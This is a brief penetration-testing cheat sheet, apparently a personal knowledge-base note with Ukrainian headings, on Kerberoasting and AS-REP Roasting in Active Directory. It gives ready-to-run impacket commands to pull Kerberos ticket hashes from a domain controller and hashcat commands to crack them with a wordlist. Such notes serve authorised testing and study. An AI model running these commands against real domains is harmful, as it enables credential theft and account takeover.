# Kerberoasting / AS-REP Roasting

## Kerberoast (SPN-акаунти)
```bash
impacket-GetUserSPNs <domain>/<u>:<p> -dc-ip <DC> -request
hashcat -m 13100 hashes.txt rockyou.txt
```
## AS-REP Roast (без preauth)
```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC>
hashcat -m 18200 hashes.txt rockyou.txt
```
**Зв'язки:** [[Password-Attacks]] · [[Lateral-Movement]]
